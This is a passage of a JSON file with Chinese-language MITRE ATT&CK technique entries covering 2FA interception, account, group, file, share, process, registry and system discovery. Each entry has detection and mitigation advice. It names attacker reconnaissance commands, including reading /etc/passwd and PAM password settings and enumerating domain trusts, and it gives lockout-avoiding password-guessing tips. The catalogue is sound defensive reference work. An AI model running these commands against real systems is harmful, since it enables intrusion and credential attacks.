			"description": "使用目标登录域作为协商协议一部分的物理第二因子密钥将通过代理方式防止会话cookie被盗。"
		}, {
			"name": "软件配置",
			"description": "配置浏览器或任务以定期删除持久cookie。"
		}, {
			"name": "用户培训",
			"description": "培训用户如何识别网络钓鱼攻击企图，这样的攻击会要求用户在其所登录应用的域不正确的站点中输入凭据。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "窃取Web会话Cookie"
}, {
	"id": "T1111",
	"description": "<p>建议使用双因子或多因子身份验证，并提供比单独使用用户名和密码更高级别的安全性，但组织应了解可用于拦截和绕过这些安全机制的技术。攻击者可能会将身份验证机制（例如智能卡）作为目标，以获取对系统，服务和网络资源的访问权限。</p><p>如果智能卡用于双因子身份验证（2FA），则在正常使用期间需要使用键盘记录程序来获取与智能卡关联的密码。通过使用插入的卡和访问智能卡密码，攻击者可以使用受感染的系统连接到网络资源，从而使用插入的硬件令牌代理身份验证。</p><p>攻击者还可能会使用键盘记录程序来以类似方式定位其他硬件令牌，例如RSA SecurID。捕获令牌输入（包括用户的个人识别码）可以提供临时访问（即重放一次性密码直到下一个值翻转），还可能使攻击者可靠地预测将来的认证值（赋予其对算法和用于生成附加临时代码的任何种子值的访问权限）。</p><p>攻击者可能会拦截并使用其它2FA方法来进行身份验证。通常通过带外通信（电子邮件，SMS）发送一次性代码。如果设备和/或服务不安全，则可能容易受到拦截。这些认证机制起初是网络犯罪分子的目标，但也已成为高级角色的目标。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["管理员", "系统"],
		"dataSources": ["API监控", "进程监控", "内核驱动"]
	},
	"relations": {
		"detection": "<p>检测攻击者是否使用代理智能卡连接可能是困难的，因为这需要将令牌插入系统中；更有可能是合法用户使用的，而且此行为已融入其他网络行为。</p><p>与输入捕获类似，键盘记录活动可以采用各种形式，但可以通过安装驱动程序，设置hook或使用与轮询相关联的特定API调用来拦截键盘输入来检测。</p>",
		"mitigations": [{
			"name": "用户培训",
			"description": "不使用时取出智能卡。"
		}],
		"tactics": ["TA0006"]
	},
	"name": "双因子认证拦截"
}, {
	"id": "T1087",
	"description": "<p>攻击者可能会尝试获取本地系统或域账号的列表。</p><p>Windows</p><p>可以获取此信息的示例命令有Net实用程序的<code>net user</code>，<code>net group</code>和<code>net localgroup</code>以及dsquery。如果攻击者试图识别主要用户、当前登录的用户或通常使用系统的一组用户，则可以使用“系统所有者/用户发现”技术。</p><p>Mac</p><p>Mac系统中，<code>groups</code>和<code>id</code>命令可用来枚举群组。Mac系统特有的<code>dscl . list /Groups</code>和<code>dscacheutil -q group</code>命令可用来枚举群组和用户。</p><p>Linux</p><p>Linux系统中，全局可读的<code>/etc/passwd</code>文件可用来枚举本地用户。Mac中，该文件仅在单用户模式下使用，除了/etc/master.passwd文件之外。</p><p>同样，<code>groups</code> 和<code>id</code> 命令可用来枚举群组。</p><p>Office 365和AzureAD</p><p>通过身份认证后，可使用多种工具来查找账户。可在给定角色或权限组的情况下使用<code>Get-MsolRoleMember</code> PowerShell cmdlet来获取账户名称。</p><p>Azure命令行界面（AZ CLI）可用于获取有权访问某域的用户账户。<code>az ad user list</code>命令可以列出域中所有的用户。</p><p>可使用<code>Get-GlobalAddressList</code> PowerShell cmdlet基于已通过身份认证的会话来从域中获取电子邮件地址和账户。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "Office 365", "Azure AD"],
		"permissionRequired": ["用户"],
		"dataSources": ["Azure活动日志", "Office 365账户日志", "API监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"name": "操作系统配置",
			"description": "防止通过UAC提升应用权限时枚举管理员帐户，因为这可能导致账号名泄露。注册表项位于HKLM\\ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\CredUI\\EnumerateAdministrators。可以通过GPO将其禁用：计算机配置 > [策略] > 管理模板 > Windows组件 > 凭据用户界面：枚举权限提升管理员账号。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "账号发现"
}, {
	"id": "T1010",
	"description": "<p>攻击者可能会尝试获取打开的应用程序窗口列表。窗口列表可以传达有关如何使用系统的信息，也可以为键盘记录程序收集的信息提供上下文。</p><p>在Mac中，可以使用小型AppleScript脚本来实现。</p>",
	"details": {
		"platform": ["macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["API监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "应用窗口发现"
}, {
	"id": "T1217",
	"description": "<p>攻击者可能会枚举浏览器书签以了解有关受感染主机的更多信息。浏览器书签可能会泄露用户的个人信息（例如：银行网站，兴趣，社交媒体等）以及内部网络资源的详细信息，例如服务器，工具/仪表盘或其他相关基础架构。</p><p>攻击者访问有效凭据后，尤其是浏览器缓存的登录信息相关文件中的凭据，浏览器书签还可能突出显示其他目标。</p><p>特定存储位置因平台和/或应用程序而异，但浏览器书签通常存储在本地文件/数据库中。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["API监控", "文件监控", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“收集”和“渗漏”。</p><p>监控进程和命令行参数来查看是否有收集浏览器书签信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "浏览器书签发现"
}, {
	"id": "T1538",
	"description": "<p>攻击者可能会在云服务仪表盘GUI上使用盗取的凭证从运营云环境中获取特定的服务、资源及功能等有用信息。例如，攻击者可以使用GCP命令中心来查看所有资产、找到潜在的安全风险以及执行其它查询（例如，查找公共IP地址和开放端口）。</p><p>攻击者可能能够通过图形化仪表盘而非API来枚举更多信息。具体取决于环境配置。以这样的方式，攻击者无需发出任何API请求即可获取信息。</p>",
	"details": {
		"platform": ["AWS", "GCP", "Azure", "Azure AD", "Office 365"],
		"permissionRequired": ["用户"],
		"dataSources": ["Office 365 audit logs", "Azure活动日志", "Stackdriver日志", "AWS CloudTrail日志"]
	},
	"relations": {
		"detection": "<p>监控账户活动日志来查看执行的操作以及与云服务管理控制台关联的活动。某些云提供商（如AWS）会记录管理控制台登录尝试的相关日志事件。</p>",
		"mitigations": [{
			"name": "用户账户管理",
			"description": "通过限制仪表盘仅对所需资源可见来实施最小权限原则。这可能会在账户遭入侵的情况下限制仪表盘的发现值。"
		}],
		"tactics": ["Discovery"]
	},
	"name": "云服务仪表盘"
}, {
	"id": "T1526",
	"description": "<p>获取访问权限后，攻击者可能会尝试枚举系统上运行的云服务。所使用的方法可能会有所不同，具体取决于是平台即服务（PaaS），基础设施即服务（IaaS），还是软件即服务（SaaS）。不同的云提供商存在许多不同的服务，并且可以包括持续集成和持续交付（CI/CD），Lambda函数，Azure AD等。攻击者可能会尝试发现环境中启用服务的相关信息。</p><p>开源AWS开发框架Pacu支持使用多种方法来发现云服务。</p>",
	"details": {
		"platform": ["AWS", "GCP", "Azure", "Azure AD", "Office 365", "SaaS"],
		"permissionRequired": ["用户"],
		"dataSources": ["Azure活动日志", "Stackdriver日志", "AWS CloudTrail日志"]
	},
	"relations": {
		"detection": "<p>攻击者很可能会在针对云化系统和服务的整个操作过程中使用云服务发现技术。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分。</p><p>云服务发现相关的、看似正常和良性的系统及网络事件可能并不常见，具体取决于环境及使用方式。监控云服务使用情况，查看是否存在可能表示环境中存在攻击者的异常行为。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "云服务发现"
}, {
	"id": "T1482",
	"description": "<p>攻击者可能会尝试收集域信任关系相关的信息，用于识别Windows多域/林环境中的横向移动机会。域信任提供了一种机制，使域资源可以被通过另外一个域身份认证的用户访问。域信任允许受信任域的用户访问信任域中的资源。发现的信息可能会有助于攻击者实施Windows安全识别符注入、票据传递攻击和Kerberos活动目录攻击。可以通过DSEnumerateDomainTrusts（）Win32 API调用、.NET方法和LDAP来枚举域信任。已知有攻击者使用Windows实用工具Nltest来枚举域信任。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["PowerShell日志", "API监控", "进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为，比如<code>nltest /domain_trusts</code>。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息。监控DSEnumerateDomainTrusts（）Win32 API调用来查看是否有域信任发现相关的活动。攻击者也可能会使用Windows系统管理工具（例如PowerShell）来获取信息。监控.NET方法GetAllTrustRelationships()来判断攻击者是否使用了域信任发现技术。</p>",
		"mitigations": [{
			"name": "审核",
			"description": "在现有域/林中映射信任关系，并将信任关系数量保持在最小范围。"
		}, {
			"name": "网络分区",
			"description": "对敏感域采取网络分区。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "域信任发现"
}, {
	"id": "T1083",
	"description": "<p>攻击者可能会枚举文件和目录，或者在主机或网络共享的特定位置搜索文件系统内的某些信息。攻击者可能会使用自动发现过程中“文件和目录发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p><p>Windows</p><p>用于获取此信息的示例实用程序包括<code>dir</code>和<code>tree</code>。也可使用自定义工具来收集文件和目录信息并与Windows API交互。</p><p>Mac and Linux</p><p>使用<code>ls</code>，<code>find</code>，和<code>locate</code>命令。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“收集”和“渗漏”。</p><p>监控进程执行和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "文件和目录发现"
}, {
	"id": "T1046",
	"description": "<p>攻击者可能会尝试获取远程主机上正在运行的服务列表，包括可能容易被远程软件利用的服务。方法包括使用系统附带的工具来扫描端口和漏洞。</p><p>攻击者可能会使用自动发现过程中“文件和目录发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p>",
	"details": {
		"platform": ["Linux", "Windows", "macOS", "AWS", "GCP", "Azure"],
		"permissionRequired": ["管理员", "系统", "用户"],
		"dataSources": ["Netflow/Enclave技术网络流分析", "网络协议分析", "网络抓包", "进程命令行参数", "网络进程使用"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>与合法远程服务扫描相关的正常、良性系统和网络事件可能不常见，具体取决于环境及其使用方式。环境中可能会有合法的开放端口和漏洞扫描，并且需要与开发的任何检测功能相冲突。网络入侵检测系统也可以用于识别扫描活动。监控网络进程使用情况，并检查网络内部流来检测端口扫描。</p>",
		"mitigations": [{
			"name": "特性或程序禁用",
			"description": "确保关闭不必要的端口和服务，防止发现和可漏洞攻击风险。"
		}, {
			"name": "网络入侵防御",
			"description": "使用网络入侵检测/防御系统来检测和阻止远程服务扫描。"
		}, {
			"name": "网络分区",
			"description": "确保采取正确的网络分区来保护关键服务器和设备。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "网络服务扫描"
}, {
	"id": "T1135",
	"description": "<p>网络上经常会有共享的网络驱动器和文件夹。这使得用户可以访问网络上各种系统上的文件目录。</p><p>Windows</p><p>Windows网络上的文件通过SMB协议进行共享。</p><p>Net的<code>net view \\remotesystem</code>命令可以用来查询远程系统中可用的共享驱动器，<code>net share</code>命令可以用来查询本地系统上的共享驱动器。</p><p>攻击者可能会寻找远程系统上共享的文件夹和驱动器。他们可能会以此手段来识别信息源，从而收集信息并确定感兴趣的系统来横向移动。</p><p>Mac</p><p>Mac系统中，<code>df -aH</code>命令可用来查看本地共享。</p><p>Cloud</p><p>获得系统访问权限后，攻击者就可以访问云虚拟网络中可能包含的远程网络共享或文件存储服务。例如，AWS，GCP和Azure支持创建可以映射在端点或云化系统上的网络文件系统（NFS）共享和服务器消息块（SMB）共享。</p>",
	"details": {
		"platform": ["macOS", "Windows", "AWS", "GCP", "Azure"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数", "网络协议分析", "网络进程使用"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>与合法远程系统发现相关的正常、良性系统和网络事件可能不常见，具体取决于环境及其使用方式。监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p><p>可使用云化系统中自带的日志功能来识别对某些可能包含系统信息的API和仪表盘的访问。仅靠数据本身可能并不足够，因为正常操作也会产生数据，具体取决于环境的使用方式。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "网络共享发现"
}, {
	"id": "T1201",
	"description": "<p>网络密码策略是一种强制要求使用难以猜到或通过暴力破解难以破译的复杂密码的方法。攻击者可能会尝试访问企业网络内使用的密码策略的详细信息。这将有助于攻击者创建一个常见密码列表并启动符合该策略的字典和/或暴力攻击（例如，如果最小密码长度应为8，则不要尝试使用诸如“pass123”之类的密码；如果账户锁定设置为6，则每个帐户尝试不超过3-4个密码，以防止帐户被锁定）。</p><p>可以在Windows，Linux和macOS系统上设置和发现密码策略。</p><p>Windows</p><p>·         <code>net accounts</code></p><p>·         <code>net accounts /domain</code></p><p>Linux</p><p>·         <code>chage -l</code></p><p>·         <code>cat /etc/pam.d/common-password</code></p><p>macOS</p><p>·         <code>pwpolicy getaccountpolicies</code></p>",
	"details": {
		"platform": ["Windows", "Linux", "macOS"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程命令行参数", "进程监控"]
	},
	"relations": {
		"detection": "<p>监控用于发现密码策略的工具和命令行参数的进程。将该活动与原始系统的其他可疑活动相关联，以减少可能的有效用户或管理员活动的误报。攻击者可能会尝试在操作的早期找到密码策略，并且该活动很可能与其他发现活动一起发生。</p>",
		"mitigations": [{
			"name": "密码策略",
			"description": "确保仅注册有效的密码过滤器。过滤器DLL必须存在于域控制器和/或本地计算机的Windows安装目录（默认为C:\\Windows\\System32\\），并且在HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages中有相应条目。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "密码策略发现"
}, {
	"id": "T1120",
	"description": "<p>攻击者可能会试图收集连接到计算机系统的周边设备和组件的信息。该信息可用于增强他们对系统和网络环境的认识，也可用于进一步的动作。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "周边设备发现"
}, {
	"id": "T1069",
	"description": "<p>攻击者可能会尝试查找本地系统或域级别的群组和权限设置。</p><p>Windows</p><p>可以列出群组的示例命令包括Net实用程序的<code>net group /domain</code>和<code>net localgroup</code>。</p><p>Mac</p><p>Mac系统中，<code>dscacheutil -q group</code>命令可用来列出域级别群组，<code>dscl . -list /Groups</code>命令可用来列出本地群组。</p><p>Linux</p><p>Linux系统中，<code>groups</code>命令可用来枚举本地群组，<code>ldapsearch</code>命令可用来枚举域级别群组。</p><p>Office 365和Azure AD</p><p>通过身份认证后，可使用多种工具来查找权限组。可使用<code>Get-MsolRole</code> PowerShell cmdlet来获取Exchange和Office 365账户的角色和权限组。</p><p>Azure命令行界面（AZ CLI）可用于获取包含某域身份认证访问权限的权限组。<code>az ad user get-member-groups</code>命令可以列出与某用户账户关联的组。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "Office 365", "Azure AD"],
		"permissionRequired": ["用户"],
		"dataSources": ["Azure活动日志", "Office 365账户日志", "API监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "权限组发现"
}, {
	"id": "T1057",
	"description": "<p>攻击者可能会尝试获取系统上正在运行进程的相关信息，从而了解网络内系统上运行的通用软件。攻击者可能会使用自动发现过程中“进程发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p><p>Windows</p><p>获取进程详细信息的示例命令有Tasklist实用程序的tasklist。</p><p>Mac and Linux</p><p>Mac和Linux系统中，<code>ps</code>命令可用来获取进程详细信息。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>看起来像进程发现的正常、良性系统和网络事件可能不常见，具体取决于环境及其使用方式。监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "进程发现"
}, {
	"id": "T1012",
	"description": "<p>攻击者可能会与Windows注册表进行交互来收集系统、配置和已安装软件的相关信息。</p><p>注册表包含操作系统、配置、软件和安全性相关的大量信息。其中一些信息可能会有助于攻击者在网络中进一步扩大其操作范围。攻击者可能会使用自动发现过程中“查询注册表”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p>",
	"details": {
		"platform": ["Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["Windows注册表", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>与Windows注册表交互的可能是实用程序（如Reg）的命令行，或者运行中的恶意软件。这些恶意软件可能会通过API与注册表交互。可以通过进程和命令行监控来查看是否有实用程序通过命令行调用来查询注册表。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "查询注册表"
}, {
	"id": "T1018",
	"description": "<p>攻击者可能会尝试通过IP地址、主机名或网络上其他可用于从当前系统进行横向移动的逻辑标识符来获取其他系统的列表。远程访问工具中可能会带此功能。一旦启动，就可以实现此目的。操作系统中的实用程序也可以用来实现此目的。攻击者还可能会使用本地主机文件来发现远程系统的主机名到IP地址映射。</p><p>Windows</p><p>获取此信息的示例工具和命令包括Net的ping或net view。<code>C:\\Windows\\System32\\Drivers\\etc\\hosts</code> 文件内容有助于深入了解系统上现有的主机名到IP的映射。</p><p>Mac</p><p>Mac系统中特有的bonjour协议用于在同一广播域中发现其他Mac系统。诸如ping之类的实用程序可用于收集远程系统相关信息。<code>/etc/hosts</code>文件内容有助于深入了解系统上现有的主机名到IP的映射。</p><p>Linux</p><p>诸如ping之类的实用程序可用于收集远程系统相关信息。<code>/etc/hosts</code>文件内容有助于深入了解系统上现有的主机名到IP的映射。</p><p>Cloud</p><p>云环境中，可以使用上述技术来发现远程系统，具体取决于主机操作系统。此外，云环境通常给API提供远程系统及服务相关信息。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "GCP", "Azure", "AWS"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["网络协议分析", "进程监控", "网络进程使用", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>与合法远程系统发现相关的正常、良性系统和网络事件可能不常见，具体取决于环境及其使用方式。监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "远程系统发现"
}, {
	"id": "T1063",
	"description": "<p>攻击者可能会尝试获取系统上安装的安全软件、配置、防御工具和传感器列表。这可能还包括本地防火墙规则、杀毒软件等相关信息。。攻击者可能会使用自动发现过程中“安全软件发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p><p>Windows</p><p>可以用来获取安全软件信息的示例命令是netsh，Reg的<code>reg query</code>，cmd的<code>dir</code>，以及Tasklist。发现行为的其他指示信息可能更具体地取决于攻击者正在寻找的软件或安全系统的类型。</p><p>Mac</p><p>MacOS恶意软件对LittleSnitch和KnockKnock软件的检查已变得越来越普遍。</p>",
	"details": {
		"platform": ["macOS", "Windows"],
		"permissionRequired": ["用户", "管理员", "系统"],
		"dataSources": ["文件监控", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "安全软件发现"
}, {
	"id": "T1518",
	"description": "<p>攻击者可能会尝试获取系统上安装的与安全无关的软件列表。攻击者可能会使用自动发现过程中“软件发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户", "管理员"],
		"dataSources": ["进程命令行参数", "进程监控", "文件监控"]
	},
	"relations": {
		"detection": "<p>攻击者在了解环境的整个操作中会使用系统和网络发现技术。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分，例如“横向移动”。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "软件发现"
}, {
	"id": "T1082",
	"description": "<p>攻击者可能会尝试获取操作系统及硬件相关的详细信息，包括版本、补丁、修补程序、服务包和架构。攻击者可能会使用自动发现过程中“系统信息发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p><p>Windows</p><p>获取此信息的示例命令和实用程序包括cmd的<code>ver</code>，Systeminfo和<code>dir</code>（用于基于当前文件和目录识别信息）。</p><p>Mac</p><p>Mac系统中，<code>systemsetup</code>命令可以列出系统的详细分解信息，但执行此命令需要管理权限。此外，<code>system_profiler</code>命令可以非常详细地分解配置、防火墙规则、已安装的卷、硬件以及许多其他内容，执行此命令不需要提升权限。</p><p>AWS</p><p>亚马逊web服务（AWS）中，攻击者可能会使用“应用发现服务”技术来识别服务器、软件及运行中的软件依赖项。</p><p>GCP</p><p>Google云平台（GCP）上，<code>/v1beta1/{{parent=organizations/</code><em>}}/assets</em>或<code><i>POST /v1beta1/{{parent=organizations/</i></code><code>}}/assets:runDiscovery</code>可用于列出组织的云资产或发现云环境中的资产。</p><p>Azure</p><p>Azure中，可发送<code>GEThttps://management.azure.com/subscriptions/{{subscriptionId}}/resourceGroups/{{resourceGroupName}}/providers/Microsoft.Compute/virtualMachines/{{vmName}}?api-version=2019-03-01</code> API请求来检索虚拟机的模型或实例视图相关信息。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows", "AWS", "GCP", "Azure"],
		"permissionRequired": ["用户"],
		"dataSources": ["Azure活动日志", "Stackdriver日志", "AWS CloudTrail日志", "进程监控", "进程命令行参数"]
	},
	"relations": {
		"detection": "<p>系统和网络发现技术通常用在攻击者试图了解环境的整个操作过程中。不应孤立地看待数据和事件，而应将其视为基于所获信息可能导致其他活动的一系列行为中的一部分。</p><p>监控进程和命令行参数来查看是否有收集系统和网络信息的行为。攻击者可能会使用带内置功能的远程访问工具来直接与Windows API交互以收集信息，也可能会使用Windows系统管理工具（例如Windows Management Instrumentation和PowerShell）来获取信息。</p><p>可使用云化系统中自带的日志功能来识别对某些可能包含系统信息的API和仪表盘的访问。仅靠数据本身可能并不足够，因为正常操作也会产生数据，具体取决于环境的使用方式。</p>",
		"mitigations": [{
			"description": "这种类型的攻击技术基于系统功能的滥用，无法通过预防性控制来轻松缓解其造成的影响。"
		}],
		"tactics": ["TA0007"]
	},
	"name": "系统信息发现"
}, {
	"id": "T1016",
	"description": "<p>攻击者可能会查找他们所访问系统的详细网络配置和设置信息，或通过远程系统信息发现技术来查找。存在几个可用于收集此信息的操作系统管理实用程序，包括Arp，ipconfig / ifconfig，nbtstat和route。</p><p>攻击者可能会使用自动发现过程中“系统网络配置发现”技术获得的信息来决定后续行为，包括攻击者是否完全感染了目标和/或尝试了特定操作。</p>",
	"details": {
		"platform": ["Linux", "macOS", "Windows"],
		"permissionRequired": ["用户"],
		"dataSources": ["进程监控", "进程命令行参数"]
	},
	"relations": {
